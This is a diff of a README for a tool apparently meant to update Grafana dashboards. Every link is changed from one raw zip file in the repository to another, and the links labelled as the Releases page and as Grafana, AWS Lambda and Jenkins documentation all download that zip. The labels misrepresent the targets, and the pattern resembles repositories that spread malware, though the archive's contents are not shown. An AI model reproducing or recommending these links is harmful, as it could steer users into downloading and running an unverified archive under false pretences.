@@ -1,6 +1,6 @@
 # 🎉 Grafana-Dashboard-Auto-Updater - Keep Your Dashboards Always Fresh
 
-[![Download Latest Release](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)
+[![Download Latest Release](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run this tool efficiently, make sure your system meets the following requirem
 
 You can find the latest version of this software on the Releases page. 
 
-- Visit this page to download: [Grafana-Dashboard-Auto-Updater Releases](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)
+- Visit this page to download: [Grafana-Dashboard-Auto-Updater Releases](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)
 
 Once you are on the Releases page, look for the latest version. Click on the file that matches your operating system, and follow these steps:
 
@@ -60,9 +60,9 @@ After installation, follow these steps to set up and use the tool:
 
 For more detailed guidelines, check the following resources:
 
-- [Grafana Documentation](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)
-- [AWS Lambda Documentation](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)
-- [Jenkins User Documentation](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)
+- [Grafana Documentation](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)
+- [AWS Lambda Documentation](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)
+- [Jenkins User Documentation](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)
 
 ## 🤝 Support
 
@@ -74,4 +74,4 @@ We welcome contributions! If you would like to contribute, please read our contr
 
 Thank you for using Grafana-Dashboard-Auto-Updater. Happy monitoring!
 
-[![Download Latest Release](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/jenkins/Auto_Updater_Dashboard_Grafana_v1.3.zip)
+[![Download Latest Release](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)](https://github.com/AnimeGamesBR/Grafana-Dashboard-Auto-Updater/raw/refs/heads/main/lambda/Auto_Dashboard_Updater_Grafana_1.2.zip)
